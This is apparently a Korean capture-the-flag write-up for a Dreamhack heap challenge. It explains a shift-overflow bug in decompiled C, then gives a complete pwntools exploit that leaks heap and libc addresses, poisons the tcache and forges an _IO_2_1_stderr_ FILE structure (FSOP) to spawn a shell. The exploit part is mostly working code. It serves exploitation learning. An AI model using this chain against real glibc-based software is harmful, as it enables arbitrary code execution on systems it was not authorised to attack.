```C

undefined8 expand(void)

{
  undefined8 uVar1;
  char *pcVar2;
  long in_FS_OFFSET;
  int idx;
  int local_28;
  uint new_size;
  long local_20;
  
  local_20 = *(long *)(in_FS_OFFSET + 0x28);
  printf("Index: ");
  __isoc99_scanf("%d",&idx);
  if ((idx < 0) || (2 < idx)) {
    puts("Invalid");
    uVar1 = 0xffffffff;
  }
  else {
    printf("shrink size (shl value): ");
    __isoc99_scanf("%d",&local_28);
    free(chunks[idx]);
    new_size = sizes[idx] << ((byte)local_28 & 0x1f);
    pcVar2 = (char *)malloc((ulong)new_size);
    chunks[idx] = pcVar2;
    uVar1 = 0;
  }
  if (local_20 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return uVar1;
}
```

잘못된 구현이 두 가지 있다. 첫 번째는 새로운 사이즈를 sizes\[idx\]에 넣지 않는 점이고, 두 번째는 integer overflow를 고려하지 못한 점이다. 예를 들어 sizes\[idx\]가 0x100이고 local_28이 0x1f라면 new_size는 uint이므로 0이 될 것이고, malloc에 의해 0x20짜리 청크가 할당된다. 청크 크기가 0x20인데 sizes\[idx\]에는 0x100이 있으므로 heap overflow가 발생한다. heap overflow가 발생하면 heap에서 다양한 행동을 할 수 있으므로 tcache positioning -> FSOP로 해결한다.

```python
from pwn import *
from time import *

context.terminal = ['tmux', 'splitw', '-h']

#p = process('./deploy/prob')
p = remote('host1.dreamhack.games', 12621)
l = ELF('./libc.so.6')

def FSOP_struct(flags=0, _IO_read_ptr=0, _IO_read_end=0, _IO_read_base=0,
                _IO_write_base=0, _IO_write_ptr=0, _IO_write_end=0, _IO_buf_base=0, _IO_buf_end=0,
                _IO_save_base=0, _IO_backup_base=0, _IO_save_end=0, _markers=0, _chain=0, _fileno=0,
                _flags2=0, _old_offset=0, _cur_column=0, _vtable_offset=0, _shortbuf=0, lock=0,
                _offset=0, _codecvt=0, _wide_data=0, _freeres_list=0, _freeres_buf=0,
                __pad5=0, _mode=0, _unused2=b"", vtable=0, more_append=b""):
    
    FSOP = p64(flags) + p64(_IO_read_ptr) + p64(_IO_read_end) + p64(_IO_read_base)
    FSOP += p64(_IO_write_base) + p64(_IO_write_ptr) + p64(_IO_write_end)
    FSOP += p64(_IO_buf_base) + p64(_IO_buf_end) + p64(_IO_save_base) + p64(_IO_backup_base) + p64(_IO_save_end)
    FSOP += p64(_markers) + p64(_chain) + p32(_fileno) + p32(_flags2)
    FSOP += p64(_old_offset) + p16(_cur_column) + p8(_vtable_offset) + p8(_shortbuf) + p32(0x0)
    FSOP += p64(lock) + p64(_offset) + p64(_codecvt) + p64(_wide_data) + p64(_freeres_list) + p64(_freeres_buf)
    FSOP += p64(__pad5) + p32(_mode)
    if _unused2 == b"":
        FSOP += b"\x00" * 0x14
    else:
        FSOP += _unused2[0x0:0x14].ljust(0x14, b"\x00")
    
    FSOP += p64(vtable)
    FSOP += more_append
    return FSOP

def _malloc(idx : int, size : int, payload : bytes):
    p.sendlineafter(b">> ", b'1')
    p.sendlineafter(b': ', str(idx).encode())
    p.sendlineafter(b': ', str(size).encode())
    p.sendafter(b': ', payload)
    if len(payload) < size : 
        sleep(0.5)
        p.send(payload)
        
def _expand(idx : int, ssize : int):
    p.sendlineafter(b">> ", b'3')
    p.sendlineafter(b': ', str(idx).encode())
    p.sendlineafter(b': ', str(ssize).encode())

def _chunk_read(idx : int):
    p.sendlineafter(b">> ", b'4')
    p.sendlineafter(b': ', str(idx).encode())
    p.recvuntil(b': ')
    return p.recvline()[:-1]

def _chunk_write(idx : int, payload : bytes):
    p.sendlineafter(b">> ", b'5')
    p.sendlineafter(b': ', str(idx).encode())
    p.sendafter(b': ', payload)
    sleep(0.5)
    p.send(payload)

def _free(idx : int):
    p.sendlineafter(b">> ", b'6')
    p.sendlineafter(b': ', str(idx).encode())
    
def _exit():
    p.sendlineafter(b">> ", b'7')

_malloc(0, 0x18, b'a' * 0x10)
_malloc(1, 0x118, b'a' * 0x10)
_malloc(2, 0x118, b'a' * 0x10)
_free(0)
_free(1)
_free(2)

_malloc(0, 0x510, b'a' * 0x10)
_malloc(1, 0x328, b'a' * 0x10)
_free(0)
_expand(1, 31)
msg = _chunk_read(1)
heap_base = u64(msg[0x20:0x28]) << 12
l.address = u64(msg[0x260:0x268]) - (0x7f5dd5222b20 - 0x7f5dd501f000)
print(hex(heap_base))
print(hex(l.address))

fake_fsop_struct = l.sym['_IO_2_1_stderr_']
stderr_lock = l.address + (0x7f6a257c2700 - 0x7f6a255bd000)
FSOP = FSOP_struct(
    flags=u64(b"\x01\x01\x01\x01;sh\x00"),
    lock=stderr_lock,
    _wide_data=fake_fsop_struct - 0x10,
    _markers=l.symbols["system"],
    _unused2=p32(0x0) + p64(0x0) + p64(fake_fsop_struct - 0x8),
    vtable=l.symbols["_IO_wfile_jumps"] - 0x40,
    _mode=0xFFFFFFFF,
)

payload = b'a' * 0x18 + p64(0x121) + b'a' * 0x118 + p64(0x121) + p64(fake_fsop_struct ^ (heap_base >> 12)) + b'\x00'
_chunk_write(1, payload)
_malloc(0, 0x118, b'a' * 0x10)
_malloc(0, 0x118, FSOP)
_exit()
p.interactive()
```